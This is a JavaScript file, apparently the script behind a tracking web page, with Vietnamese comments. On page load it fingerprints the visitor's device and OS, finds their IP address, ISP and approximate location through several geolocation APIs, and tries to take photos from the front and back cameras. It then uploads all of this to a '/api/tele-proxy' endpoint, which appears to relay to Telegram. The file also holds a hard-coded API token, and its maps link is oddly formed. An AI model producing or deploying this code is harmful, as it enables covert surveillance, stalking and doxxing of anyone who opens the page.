// main.js - XỊN, GỌN, LẤY ĐƯỢC TẤT CẢ DỮ LIỆU + ẢNH
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  ip: 'Đang lấy...',
  isp: 'Đang lấy...',
  location: 'Đang lấy...',
  country: 'Đang lấy...',
  latitude: 'Đang lấy...',
  longitude: 'Đang lấy...',
  google_maps: '',
  camera: '⏳ Đang kiểm tra...',
  note: 'Thông tin có khả năng chưa chính xác 100%.'
};

// --- NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio || 1;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const models = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro",
      "428x926@3": "iPhone 12/13/14 Pro Max",
      "390x844@3": "iPhone 12/13/14",
      "414x896@3": "iPhone XS Max/11 Pro Max",
      "375x812@3": "iPhone X/11 Pro",
      "375x667@2": "iPhone SE/8/7/6"
    };
    info.device = models[res] || 'iPhone';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else if (ua.includes('Windows')) {
    info.os = 'Windows';
    info.device = 'PC/Laptop';
  } else if (ua.includes('Mac')) {
    info.os = 'macOS';
    info.device = 'Mac';
  } else {
    info.os = 'Desktop';
    info.device = 'PC/Laptop';
  }
}

// --- LẤY IP VÀ VỊ TRÍ (3 API DỰ PHÒNG) ---
async function getGeoInfo() {
  const apis = [
    'https://ipapi.co/json/',
    'https://ipwho.is/',
    'https://ipinfo.io/json?token=8b2b4c3a2e1d6f'
  ];
  
  for (const api of apis) {
    try {
      const res = await fetch(api);
      const data = await res.json();
      
      if (data.ip || data.query) {
        info.ip = data.ip || data.query;
        info.isp = data.org || data.isp || data.asn?.name || 'Không xác định';
        info.country = data.country_name || data.country || 'Không xác định';
        info.location = `${data.city || ''}, ${data.region || data.region_name || ''}, ${info.country}`.replace(/^, |, , /g, '');
        info.latitude = data.latitude || data.lat || 'Không xác định';
        info.longitude = data.longitude || data.lon || 'Không xác định';
        
        if (info.latitude !== 'Không xác định') {
          info.google_maps = `http://googleusercontent.com/maps.google.com/${info.latitude},${info.longitude}`;
        }
        return;
      }
    } catch(e) {}
  }
}

// --- CHỤP ẢNH CAMERA ---
async function captureCamera(facingMode = 'user') {
  if (!navigator.mediaDevices?.getUserMedia) return null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        }, 500);
      };
    });
  } catch (e) {
    return null;
  }
}

// --- HÀM CHÍNH ---
async function main() {
  console.log("🚀 Bắt đầu...");
  
  detectDevice();
  await getGeoInfo();
  
  const front = await captureCamera('user');
  const back = await captureCamera('environment');
  
  info.camera = (front || back) ? '✅ Đã chụp camera trước và sau' : '🚫 Bị chặn hoặc không có camera';
  
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));
  if (front) formData.append('front', front);
  if (back) formData.append('back', back);
  
  try {
    await fetch(API_PROXY, { method: 'POST', body: formData });
    console.log("✅ Đã gửi thành công");
  } catch(e) {}
  
  window.mainScriptFinished = true;
}

main();